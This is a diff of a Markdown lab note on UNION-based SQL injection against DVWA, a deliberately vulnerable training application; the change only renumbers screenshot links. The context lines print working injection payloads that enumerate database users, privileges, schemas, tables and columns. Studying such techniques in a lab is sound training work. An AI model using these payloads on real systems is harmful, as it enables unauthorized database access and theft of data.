@@ -18,7 +18,7 @@ Search Tag(s): #sql-injection #union #enumeration-and-discovery #dvwa
 
 - Keep Enumerating it until you've triggered an error.
 
-![[01 - ORDER BY Enumerate One Field.png]]
+![[1.1 - ORDER BY Enumerate One Field.png]]
 
 ```
 Unknown column '3' in 'order clause'
@@ -80,7 +80,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 
 - The DBMS server is MariaDB which is a fork of MySQL.
 
-![[1.1 - Banner Grab.png]]
+![[1.2 - Banner Grab.png]]
 
 #### 1.2.1.2 - Current Database
 
@@ -90,7 +90,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 
 - The current database is `dvwa`
 
-![[1.2 - Current Database.png]]
+![[1.3 - Current Database.png]]
 
 #### 1.2.1.3 - Current Database User
 
@@ -100,7 +100,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 
 - The current database is `dvwa@localhost`.
 
-![[1.3 - Current User.png]]
+![[1.4 - Current User.png]]
 
 - Check the current database user is DBA (database administrator).
 
@@ -112,7 +112,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 ' UNION SELECT GROUP_CONCAT(user, '->', 'SUPER', '->', super_priv), NULL FROM mysql.user WHERE user = 'dvwa'#
 ```
 
-![[1.4 - DBA User.png]]
+![[1.5 - DBA User.png]]
 
 #### 1.2.1.4 - Enumerate DBMS Users
 
@@ -126,7 +126,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 ' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SUPER' AND GRANTEE LIKE "'dvwa'%"#
 ```
 
-![[1.5 - Enumerate DBMS Users.png]]
+![[1.6 - Enumerate DBMS Users.png]]
 
 - Enumerate DBA users.
 
@@ -136,7 +136,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 ' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SUPER'#
 ```
 
-![[1.6 - Enumerate DBA Users.png]]
+![[1.7 - Enumerate DBA Users.png]]
 
 #### 1.2.1.5 - Schema Database Enumeration
 
@@ -144,7 +144,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 ' UNION SELECT NULL, schema_name FROM information_schema.schemata#
 ```
 
-![[1.7 - Enumerate Databases.png]]
+![[1.8 - Enumerate Databases.png]]
 
 Let's enumerate the tables.
 
@@ -154,7 +154,7 @@ Let's enumerate the tables.
 ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
 ```
 
-![[1.8 - Enumerate Tables With The Current Database.png]]
+![[1.9 - Enumerate Tables With The Current Database.png]]
 
 You can narrow it down.
 
@@ -176,7 +176,7 @@ Let's enumerate the columns.
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_schema = database() AND table_name = 'users'#
 ```
 
-![[1.9 - Enumerate Columns With The Current Database.png]]
+![[1.10 - Enumerate Columns With The Current Database.png]]
 
 Let's note down the columns we've discovered that are potential to retrieve data
 
